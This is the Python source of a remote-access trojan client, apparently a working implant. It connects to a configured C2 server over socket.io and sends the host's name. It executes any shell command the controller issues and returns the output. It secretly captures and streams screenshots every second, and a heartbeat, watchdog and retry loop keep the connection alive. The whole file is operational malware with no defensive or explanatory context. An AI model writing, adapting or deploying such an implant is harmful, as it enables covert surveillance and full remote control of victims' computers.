import os
import socket
import socketio
import subprocess
import time
import platform
import mss
import base64
from PIL import Image
import io
import threading

# --- Configuration ---
C2_ADDRESS = "http://localhost:8004"
RETRY_INTERVAL = 30
TARGET_HEIGHT = 720

# --- Intervals (Now Mutable) ---
DEFAULT_SCREENSHOT_INTERVAL = 1.0  # Seconds
SCREENSHOT_INTERVAL = DEFAULT_SCREENSHOT_INTERVAL

# --- Persistence Configuration ---
SCHEDULED_RECONNECT_SECONDS = 15 * 60
HEARTBEAT_INTERVAL_SECONDS = 5
WATCHDOG_TIMEOUT_SECONDS = 20

# --- Global State ---
sio = socketio.Client(logger=False, engineio_logger=False)
connection_start_time = 0
last_pong_time = 0
screenshot_thread = None
heartbeat_thread = None


# --- Functions ---
def get_hostname_local():
    return socket.gethostname()


def send_command_output(output):
    if sio.connected:
        sio.emit('command_output', {'output': output}, namespace="/api")


def send_screenshot(image_data):
    if sio.connected:
        sio.emit('screenshot', image_data, namespace="/api")


def take_screenshots():
    global SCREENSHOT_INTERVAL
    with mss.mss() as sct:
        while True:
            if not sio.connected:
                time.sleep(1)
                continue
            try:
                sct_img = sct.grab(sct.monitors[1])
                img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                if img.height == 0: continue
                new_h = TARGET_HEIGHT
                new_w = int(new_h * (img.width / img.height))
                if new_w <= 0: continue
                resized_img = img.resize((new_w, new_h), Image.LANCZOS)
                buffered = io.BytesIO()
                resized_img.save(buffered, format="JPEG", quality=75)
                img_str = base64.b64encode(buffered.getvalue()).decode('utf-8')
                send_screenshot(img_str)

                time.sleep(max(0.01, SCREENSHOT_INTERVAL))
            except Exception as e:
                print(f"Screenshot error: {e}")
                time.sleep(SCREENSHOT_INTERVAL)


def start_heartbeat():
    while True:
        time.sleep(HEARTBEAT_INTERVAL_SECONDS)
        if sio.connected:
            try:
                sio.emit('client_ping', namespace="/api")
            except Exception as e:
                print(f"Ping error: {e}")


@sio.on('connect', namespace="/api")
def on_connect():
    global connection_start_time, last_pong_time
    connection_start_time = time.time()
    last_pong_time = time.time()
    print(f'Connected. SID: {sio.sid}. Sending client info.')
    sio.emit('client_info', {'hostname': get_hostname_local()}, namespace="/api")


@sio.on('disconnect', namespace="/api")
def on_disconnect():
    global connection_start_time
    connection_start_time = 0
    print('Disconnected.')


@sio.on('server_pong', namespace="/api")
def on_server_pong():
    global last_pong_time
    last_pong_time = time.time()


def handle_internal_command(command_str):
    global SCREENSHOT_INTERVAL
    parts = command_str.split()
    if not parts: return

    cmd = parts[0].lower()

    if cmd == "#scrsht":
        if len(parts) > 1:
            val = parts[1].lower()
            if val == "reset":
                SCREENSHOT_INTERVAL = DEFAULT_SCREENSHOT_INTERVAL
                send_command_output(f"Screenshot interval reset to default ({SCREENSHOT_INTERVAL}s)")
            else:
                try:
                    ms = float(val)
                    SCREENSHOT_INTERVAL = ms / 1000.0
                    send_command_output(f"Screenshot interval set to {ms}ms ({SCREENSHOT_INTERVAL}s)")
                except ValueError:
                    send_command_output("Error: #scrsht requires a number in milliseconds or 'reset'")
        else:
            send_command_output(f"Current screenshot interval: {SCREENSHOT_INTERVAL * 1000}ms")
    else:
        send_command_output(f"Unknown internal command: {cmd}")


@sio.on('execute_command', namespace="/api")
def handle_command(command_str):
    command_str = command_str.strip()

    if command_str.startswith("#"):
        handle_internal_command(command_str)
        return

    try:
        process = subprocess.Popen(command_str, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
                                   errors='ignore')
        stdout, stderr = process.communicate()
        send_command_output(stdout + stderr)
    except Exception as e:
        send_command_output(f"Command execution error: {e}")


def attempt_connection():
    while True:
        print(f"Attempting to connect to: {C2_ADDRESS}")
        try:
            if sio.connected: sio.disconnect()
            sio.connect(C2_ADDRESS, namespaces=['/api'])
            return
        except Exception as e:
            print(f"Connection to {C2_ADDRESS} failed: {e}")
            print(f"Retrying in {RETRY_INTERVAL}s...")
            time.sleep(RETRY_INTERVAL)


# --- Main Execution Logic ---
if __name__ == '__main__':
    threading.Thread(target=take_screenshots, daemon=True).start()
    threading.Thread(target=start_heartbeat, daemon=True).start()

    while True:
        try:
            if not sio.connected:
                print("Main: Disconnected. Initiating connection...")
                attempt_connection()

            print("Main: Connected. Monitoring state...")
            while sio.connected:
                if time.time() - last_pong_time > WATCHDOG_TIMEOUT_SECONDS:
                    print(f"Watchdog: No server pong in >{WATCHDOG_TIMEOUT_SECONDS}s. Forcing reconnect.")
                    sio.disconnect()
                    break

                if time.time() - connection_start_time > SCHEDULED_RECONNECT_SECONDS:
                    print(f"Scheduler: >{SCHEDULED_RECONNECT_SECONDS // 60}m uptime. Reconnecting.")
                    sio.disconnect()
                    break

                time.sleep(5)

            print("Main: Loop detected disconnect. Will restart process.")
            time.sleep(5)

        except KeyboardInterrupt:
            print("\nExiting on user request.")
            break
        except Exception as e:
            print(f"---! UNHANDLED EXCEPTION IN MAIN LOOP: {e} !---")
            if sio and sio.connected:
                sio.disconnect()
            time.sleep(RETRY_INTERVAL)

    if sio.connected:
        sio.disconnect()